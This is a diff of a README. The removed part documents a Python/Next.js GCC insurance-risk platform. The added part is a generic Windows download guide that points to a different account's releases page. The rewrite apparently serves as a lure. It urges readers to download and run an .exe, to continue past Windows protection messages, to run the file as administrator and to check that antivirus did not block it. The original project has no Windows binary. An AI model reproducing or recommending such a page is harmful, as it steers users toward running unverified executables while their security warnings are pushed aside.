@@ -1,294 +1,226 @@
-# Deevo Cortex
+# 🛰️ deevo-monitor - GCC risk tracking made simple
 
-**Economic Intelligence Layer for GCC Insurance Markets**
+[![Download deevo-monitor](https://img.shields.io/badge/Download%20deevo--monitor-7b5cff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mendoraa/deevo-monitor/releases)
 
-Transforms geopolitical events into explainable economic intelligence — causal chains, sector impact analysis, scenario scoring, and executive decision insights focused on the Gulf Cooperation Council region.
+## 🔍 What it does
 
-> **Status**: MVP / Applied Intelligence Platform. Backend core is production-tested (39/39 tests passing). Frontend dashboard is functional and wired to live API. Not yet deployed to production.
+deevo-monitor is a Windows app that shows real-time risk and intelligence data in one place. It brings together AI-based insurance risk checks, geopolitical tracking, and infrastructure monitoring in a single dashboard.
 
----
+Use it to:
 
-## Overview
+- Watch changes across Gulf and GCC regions
+- Track insurance-related risk signals
+- Review alerts tied to infrastructure and public events
+- Keep an eye on OSINT-style data feeds
+- See AI-based summaries without digging through many sources
 
-Deevo Cortex is a decision-intelligence platform that takes real-world events (oil supply disruptions, sanctions, regional conflicts) and runs them through an economic reasoning pipeline to produce actionable intelligence for insurance executives operating in GCC markets.
+The app is built for people who want a clear view of fast-moving events without reading many reports.
 
-The system routes events to specialized economic agents, builds deterministic causal chains using graph-based BFS propagation, scores scenarios across severity tiers, and outputs GCC-specific impact assessments with insurance-grade risk signals.
+## 💻 Before you start
 
-## Core Capabilities
+Use a Windows PC with:
 
-- **Event Classification** — Categorizes geopolitical events by type, severity, and affected sectors
-- **Multi-Agent Economic Analysis** — 5 specialized agents (Oil Market, Shipping & Logistics, Insurance Risk, Banking & Liquidity, GCC Fiscal) analyze events from their domain perspective
-- **Causal Chain Construction** — Deterministic graph-based reasoning that traces cause → effect propagation across economic sectors
-- **Scenario Scoring** — Base / Elevated / Severe scenarios with probability ranges and confidence intervals
-- **GCC Country Impact** — Per-country breakdown for all 6 GCC states with oil dependency weighting
-- **Insurance Risk Scoring** — 5 composite scores (Market Stress, Claims Pressure, Fraud Exposure, Underwriting Risk, Portfolio Stability) on a 0–100 scale
-- **Recommendation Engine** — 12 rule-based recommendations (R01–R12) mapping score thresholds to executive actions
-- **Adaptive Calibration** — Prediction → Outcome → Error analysis → Weight update cycle (EMA α=0.3)
-- **Decision Insights** — Plain-language executive summaries explaining what happens, why, and what to do
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- About 500 MB of free disk space
+- A stable internet connection
+- Permission to install and run apps
 
-## Architecture
+If your PC is older, the app may still run, but it can feel slower when many data feeds are active.
 
-```
-Event Input
-    │
-    ▼
-Classify Event ─────► Route to Agents (5 domain experts)
-    │                       │
-    ▼                       ▼
-Build Causal Chain    Agent Outputs (sector impacts)
-    │                       │
-    ▼                       ▼
-Score Scenarios ◄──── GCC Breakdown (6 countries)
-    │
-    ▼
-Insurance Analysis ──► Graph Simulation ──► Decision Insight
-    │                                            │
-    ▼                                            ▼
-5 Risk Scores ──► 12 Recommendations      Explanation Bundle
-```
+## 📥 Download deevo-monitor
 
-### 7-Layer Intelligence Stack
+Go to the releases page here and download and run this file:
 
-| Layer | Component | Purpose |
-|-------|-----------|---------|
-| Data | Signal Ingestion | Raw market signals and event feeds |
-| Features | Event Classification | Normalize and categorize inputs |
-| Models | Economic Agents | Domain-specific impact modeling |
-| Agents | Causal Chain + Scenarios | Graph reasoning and scenario generation |
-| APIs | FastAPI v1 + Legacy | 34 endpoints across 2 API versions |
-| UI | Next.js Dashboard | 6 screens with live API integration |
-| Governance | Calibration + Audit | SHA-256 audit trails, adaptive weights |
+https://github.com/Mendoraa/deevo-monitor/releases
 
-## Tech Stack
+On the releases page, look for the latest version and pick the Windows file. In most cases, that will be an `.exe` installer or a `.zip` file that contains the app.
 
-| Component | Technology |
-|-----------|------------|
-| Frontend | Next.js 14, React 18, Tailwind CSS, Lucide Icons |
-| Backend | Python 3.11+, FastAPI, Pydantic v2, SQLAlchemy 2.0 |
-| Database | PostgreSQL 16 |
-| Containerization | Docker Compose |
-| Package Manager | npm (frontend), pip (backend) |
+If you download a `.zip` file, extract it first, then open the app inside the folder.
 
-## Repository Structure
+## 🪟 Install on Windows
 
-```
-deevo-cortex/
-├── backend/
-│   ├── app/
-│   │   ├── agents/            # 5 economic sector agents
-│   │   ├── api/               # v1 production API routes (8 routers)
-│   │   ├── core/              # Enums and constants
-│   │   ├── db/                # SQLAlchemy models (10 tables)
-│   │   ├── engines/           # Core pipeline: classify, route, chain,
-│   │   │   ├── calibration/   #   score, insight, calibration,
-│   │   │   ├── graph/         #   graph simulation,
-│   │   │   ├── insurance/     #   insurance analysis,
-│   │   │   └── scoring/       #   and scoring engine
-│   │   ├── mocks/             # 5 preset scenario payloads
-│   │   ├── prompts/           # LLM prompt templates
-│   │   ├── routes/            # Legacy economic-layer endpoints
-│   │   ├── schemas/           # Pydantic data contracts (11 schemas)
-│   │   └── services/          # Business logic services (10 services)
-│   ├── migrations/            # Alembic database migrations
-│   ├── scripts/               # Seed data scripts
-│   ├── tests/                 # pytest suite (39 tests)
-│   ├── Dockerfile
-│   └── requirements.txt
-├── frontend/
-│   ├── src/
-│   │   ├── app/               # Next.js pages (6 screens)
-│   │   │   ├── economic/      # Economic Layer analysis
-│   │   │   ├── world/         # World Monitor — GCC regions
-│   │   │   ├── kuwait-motor/  # Kuwait Motor portfolio detail
-│   │   │   ├── recommendations/ # 12-rule recommendation engine
-│   │   │   └── calibration/   # Adaptive calibration dashboard
-│   │   ├── components/        # Reusable UI components
-│   │   │   └── ui/            # ScoreGauge, RiskBadge, StatCard, etc.
-│   │   ├── lib/               # API clients, presets, mock data
-│   │   └── types/             # TypeScript type definitions
-│   ├── Dockerfile
-│   ├── package.json
-│   └── tsconfig.json
-├── data/
-│   └── init.sql               # PostgreSQL schema initialization
-├── docs/                      # Architecture and design documents
-│   ├── DATA_CONTRACT.md
-│   ├── PRODUCT_SCOPE.md
-│   ├── SCORING_RULES.md
-│   ├── RECOMMENDATION_RULEBOOK.md
-│   ├── SYSTEM_ARCHITECTURE.md
-│   └── README_PROJECT_HANDOFF.md
-├── specs/                     # Graph and seed data specifications
-├── docker-compose.yml
-└── .env.example
-```
+### If you downloaded an installer
 
-## Getting Started
+1. Open the file you downloaded.
+2. If Windows asks for permission, choose Yes.
+3. Follow the setup steps on screen.
+4. Choose the install folder if asked.
+5. Finish the setup.
+6. Open deevo-monitor from the Start menu or desktop shortcut.
 
-### Prerequisites
+### If you downloaded a ZIP file
 
-- Docker and Docker Compose (recommended)
-- Or: Node.js 18+, Python 3.11+, PostgreSQL 16
+1. Right-click the ZIP file.
+2. Choose Extract All.
+3. Pick a folder you can find again, such as Downloads or Desktop.
+4. Open the extracted folder.
+5. Double-click the app file inside the folder.
 
-### Quick Start with Docker
+If Windows shows a protection message, check the file name and source, then choose the option that lets you continue if you trust the download.
 
-```bash
-# Clone the repository
-git clone https://github.com/PyBADR/deevo-monitor.git
-cd deevo-monitor
+## 🚀 First run
 
-# Copy environment file
-cp .env.example .env
+When you open deevo-monitor for the first time, it may take a moment to load the dashboard.
 
-# Start all services
-docker compose up --build
+You may see:
 
-# Frontend:  http://localhost:3000
-# Backend:   http://localhost:8000
-# API Docs:  http://localhost:8000/docs
-```
+- A main overview screen
+- Side panels for alerts or feeds
+- Filters for region, topic, or risk level
+- A refresh control for live updates
+- A settings page for display and data options
 
-### Manual Setup
+If the app asks for access to the network, allow it. The dashboard needs internet access to fetch live data.
 
-**Backend:**
+## 🧭 How to use the dashboard
 
-```bash
-cd backend
-python -m venv venv
-source venv/bin/activate       # Windows: venv\Scripts\activate
-pip install -r requirements.txt
-cp .env.example .env           # Edit with your database URL
-uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
-```
+### Overview panel
 
-**Frontend:**
+The overview panel gives you a fast look at the latest activity. It helps you see:
 
-```bash
-cd frontend
-npm install
-cp .env.example .env.local     # Set NEXT_PUBLIC_API_URL
-npm run dev
-```
+- New alerts
+- High-risk events
+- Current region focus
+- AI summary cards
+- Recent changes in monitored sources
 
-**Database:**
+### Risk monitoring
 
-```bash
-# Using Docker for database only
-docker compose up db -d
+The risk area helps you follow signals tied to:
 
-# Or use your own PostgreSQL and run:
-psql -U deevo -d deevo_cortex -f data/init.sql
-```
+- Insurance exposure
+- Regional instability
+- Supply chain pressure
+- Critical infrastructure events
+- Public incidents that may affect operations
 
-## Environment Variables
+Use the filters to narrow the view by time, place, or topic.
 
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `DATABASE_URL` | PostgreSQL async connection string | See `.env.example` |
-| `DATABASE_URL_SYNC` | PostgreSQL sync connection string | See `.env.example` |
-| `OLLAMA_BASE_URL` | Ollama LLM endpoint (optional) | `http://localhost:11434` |
-| `APP_ENV` | Environment mode | `development` |
-| `NEXT_PUBLIC_API_URL` | Backend URL for frontend | `http://localhost:8000` |
-| `ALLOWED_ORIGINS` | CORS allowed origins | `http://localhost:3000` |
-| `CALIBRATION_MODE` | Calibration strategy | `semi_auto` |
-| `DEFAULT_MARKET` | Target market | `KWT` |
-| `DEFAULT_PORTFOLIO` | Target portfolio | `motor_retail` |
+### Geopolitical tracking
 
-## API Reference
+This section helps you watch movement in GCC and nearby regions. It can show:
 
-### Legacy Economic Layer
+- Country-level updates
+- Border or trade events
+- Security-related news
+- Policy changes
+- Regional tension indicators
 
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| POST | `/api/economic-layer/cortex` | Full Cortex pipeline (economic + insurance + graph + explanation) |
-| POST | `/api/economic-layer/analyze` | Economic analysis only |
-| POST | `/api/economic-layer/classify` | Event classification |
-| POST | `/api/economic-layer/scenario` | Scenario scoring |
-| POST | `/api/economic-layer/insurance` | Insurance analysis |
-| POST | `/api/economic-layer/graph` | Graph simulation |
-| POST | `/api/economic-layer/scorecard` | GCC scorecards |
-| GET | `/api/economic-layer/health` | Health check |
+### Intelligence view
 
-### Production API v1
+The intelligence view brings related data together so you can scan trends. It may group items by source, tag, or severity.
 
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/api/v1/health` | Service health and readiness |
-| POST | `/api/v1/signals/ingest` | Signal ingestion |
-| GET | `/api/v1/graph/nodes` | Graph node registry |
-| POST | `/api/v1/scoring/run` | Run scoring engine |
-| GET | `/api/v1/predictions/{id}` | Get prediction by ID |
-| POST | `/api/v1/feedback/outcomes` | Submit outcome feedback |
-| POST | `/api/v1/calibration/run` | Run calibration cycle |
-| GET | `/api/v1/recommendations/{id}` | Get recommendations |
+This helps when you need to compare multiple updates without opening each item one by one.
 
-Full interactive documentation available at `http://localhost:8000/docs` when the backend is running.
+## ⚙️ Settings
 
-## Testing
+Open the settings page if you want to change how the app behaves.
 
-```bash
-cd backend
-pip install pytest pytest-asyncio httpx
-pytest -v                      # Run all 39 tests
-pytest tests/test_e2e_pipeline.py -v   # End-to-end pipeline tests
-```
+Common settings include:
 
-## Deployment
+- Dark or light mode
+- Auto refresh rate
+- Alert sound
+- Time zone
+- Region focus
+- Language or display format
+- Startup behavior
 
-### Frontend (Vercel)
+If the dashboard feels busy, turn off extra panels and keep only the parts you use most.
 
-The Next.js frontend can be deployed to Vercel:
+## 🔄 Updating the app
 
-1. Import the GitHub repository in Vercel
-2. Set **Root Directory** to `frontend`
-3. Framework Preset: **Next.js**
-4. Add environment variable: `NEXT_PUBLIC_API_URL` = your production backend URL
-5. Deploy
+To get the latest version:
 
-### Backend
+1. Open the releases page.
+2. Check the newest release.
+3. Download the new Windows file.
+4. Close the app if it is running.
+5. Install or replace the old files.
 
-The FastAPI backend should be deployed separately (Render, Railway, Fly.io, or any container platform):
+Use the same download page each time:
 
-1. Deploy the `backend/` directory with the included Dockerfile
-2. Set environment variables (see `.env.example`)
-3. Ensure PostgreSQL is accessible
-4. Update frontend's `NEXT_PUBLIC_API_URL` to point to the deployed backend
+https://github.com/Mendoraa/deevo-monitor/releases
 
-## Roadmap
+## 🛠️ Common issues
 
-- [x] Economic analysis pipeline with 5 agents
-- [x] Graph-based causal chain reasoning
-- [x] Scenario scoring (Base / Elevated / Severe)
-- [x] GCC country impact breakdown
-- [x] Insurance risk scoring (5 composite scores)
-- [x] Recommendation engine (12 rules)
-- [x] Adaptive calibration with EMA
-- [x] Next.js dashboard with 6 screens
-- [x] Live API integration (frontend ↔ backend)
-- [ ] Production deployment (Vercel + backend hosting)
-- [ ] Real-time signal ingestion from market feeds
-- [ ] LLM-enhanced agent reasoning (Ollama integration)
-- [ ] Multi-tenant data isolation
-- [ ] PDPL / IFRS 17 compliance layer
+### The app does not open
 
-## Scope
+- Try running it again
+- Right-click the app and choose Run as administrator
+- Make sure the file finished downloading
+- Check that your antivirus did not block it
 
-This MVP focuses exclusively on the **Kuwait (KWT)** market and the **motor_retail** portfolio. Expansion to additional GCC markets and portfolio types is planned but not yet implemented.
+### The screen is blank
 
-## License
+- Wait a few seconds for live data to load
+- Check your internet connection
+- Refresh the dashboard
+- Restart the app
 
-This project is licensed under the MIT License. See [LICENSE](LICENSE) for details.
+### The app runs slowly
 
-## Contributing
+- Close other large apps
+- Lower the refresh rate
+- Reduce the number of visible panels
+- Restart Windows if memory is low
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development guidelines and contribution workflow.
+### Windows blocks the file
 
-## Security
+- Make sure you downloaded it from the releases page
+- Re-download the latest file
+- Choose the Windows app file, not the source code archive
 
-See [SECURITY.md](SECURITY.md) for vulnerability reporting and security practices.
+## 📁 What you get
 
-## Maintainer
+deevo-monitor is set up as a dashboard app for daily use. It is meant to help you follow live data in a clean layout.
 
-**BDRAI** — [bader.marketing.39@gmail.com](mailto:bader.marketing.39@gmail.com)
+Typical parts of the app include:
 
-Built with the [Deevo Analytics](https://github.com/PyBADR) platform.
+- A main dashboard
+- Alert cards
+- Region filters
+- Risk labels
+- Source lists
+- AI-based summaries
+- Trend views
+
+## 🔐 Data and privacy
+
+The app works with public and external intelligence sources. It may connect to online services to fetch fresh data and display updates.
+
+Keep these points in mind:
+
+- Only use trusted networks
+- Review any app permissions
+- Close the app when you do not need live tracking
+- Use a work device only if your team allows it
+
+## 🧩 Who this is for
+
+This app fits users who want a simple way to watch live risk and regional updates. It can help:
+
+- Insurance teams
+- Risk analysts
+- Security teams
+- Operations staff
+- Research users
+- People who follow GCC developments
+
+## 📌 Download again if needed
+
+If you need the latest build or want to reinstall, use this page:
+
+https://github.com/Mendoraa/deevo-monitor/releases
+
+## 📎 File names you may see
+
+The release may include files such as:
+
+- `deevo-monitor-setup.exe`
+- `deevo-monitor-win64.exe`
+- `deevo-monitor.zip`
+- `deevo-monitor-portable.zip`
+
+Pick the Windows file that matches how you want to use the app. If you want the easiest path, use the setup file.
